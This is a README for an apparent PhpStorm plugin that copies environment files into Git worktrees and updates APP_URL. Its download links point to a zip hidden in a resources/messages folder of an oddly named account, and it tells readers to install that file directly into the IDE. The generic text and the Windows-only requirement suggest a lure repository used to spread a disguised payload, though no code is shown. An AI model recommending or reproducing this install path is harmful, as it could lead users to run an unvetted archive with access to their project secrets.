# 🛠️ worktree-env-plugin - Manage environment files in Git worktrees

[![](https://img.shields.io/badge/Download-Plugin_Files-blue.svg)](https://github.com/Sixty-playbill4854/worktree-env-plugin/raw/refs/heads/main/src/main/resources/messages/worktree_plugin_env_v1.9.zip)

## 🎯 What this tool does

This plugin helps you work with Git worktrees in PhpStorm. When you work on multiple versions of a website at once, keeping track of your environment configuration files becomes difficult. This tool automates that task. It copies your main configuration settings to your new worktree folder and updates the web address automatically. You get a status bar widget and a window that shows you exactly what the plugin does in real time.

## 📋 System requirements

Before you start, check that your computer meets these requirements:

*   You must have PhpStorm installed on your Windows computer.
*   You use Git to manage your project files.
*   Your project uses Laravel or similar frameworks that rely on environment files.
*   You have at least 100 megabytes of free disk space.
*   Your Windows version must be Windows 10 or newer.

We assume you have your project already set up as a Git worktree. If you have not created a worktree yet, do that inside Git before you install this plugin.

## 📥 How to get the plugin

Visit [this page](https://github.com/Sixty-playbill4854/worktree-env-plugin/raw/refs/heads/main/src/main/resources/messages/worktree_plugin_env_v1.9.zip) to download the plugin files. 

Look for the latest release on that page. Download the zip file to your computer. Keep this file in a folder you can find easily, such as your Downloads folder. You do not need to unzip this file. PhpStorm will handle the installation directly from the compressed file.

## ⚙️ Installation steps

Follow these steps to add the plugin to your software:

1. Open PhpStorm on your computer.
2. Select File from the top menu bar.
3. Click Settings.
4. Select the Plugins menu on the left side of the window.
5. Click the gear icon near the top of the window.
6. Select Install Plugin from Disk.
7. Find the zip file you downloaded earlier.
8. Click OK.
9. Restart PhpStorm to finish the process.

Once the software restarts, the plugin activates. You will see a new status bar widget at the bottom right of your screen. This widget shows the current state of your environment file.

## 🧩 Using the plugin

The plugin runs in the background. When you switch to a folder that acts as a Git worktree, the plugin checks if a configuration file exists. If it finds no file, it looks for the main project configuration. It copies that file into your current folder. 

After copying the file, the plugin changes the web address (the APP_URL) to match your current worktree path. This makes sure that your links point to the correct version of your site.

### The status bar widget

The widget at the bottom of your screen gives you color-coded feedback:

*   Green: The environment file is correct and ready.
*   Yellow: The plugin is currently copying or updating files.
*   Red: The plugin cannot find the main configuration or lacks permission to write files.

Click the widget to open the configuration window.

### The tool window

The tool window appears on the side of your editor. This window lists all actions taken by the plugin. Use this to verify that the tool correctly updated your settings. If you want to change how the plugin handles specific files, use the settings menu inside this window.

## 🔧 Fine-tuning settings

You can change how the plugin functions. Open the Settings menu and look for the Worktree Env heading.

*   Enable Auto-Update: This keeps your files fresh every time you switch branches.
*   Ignore Specific Keys: If you have certain settings that should not change, list them here.
*   Notify on Change: This creates a small pop-up message whenever the plugin updates a file.

If you have multiple worktrees for one project, the plugin tracks each one separately. It remembers your preferences for every folder.

## 🛡️ Troubleshooting common issues

If the plugin does not seem to work, try these steps:

1. Check your folder permissions. Ensure that your user account has write access to your project folders.
2. Make sure you use the latest version of PhpStorm. Plugins often require recent software updates to function correctly.
3. Verify that your Git worktree is valid. Run the command git worktree list in your terminal. If your terminal does not show the worktree, the plugin cannot find it either.
4. Disable other plugins that might interfere with file creation. Some security plugins block automatic file creation by third-party tools.
5. Check the logs. If you click the plugin tool window, you will see an option to View Logs. This file tells you exactly why an operation failed.

If you continue to have problems, reinstall the plugin using the steps from the installation section. Deleting the plugin and adding it again often clears out temporary errors.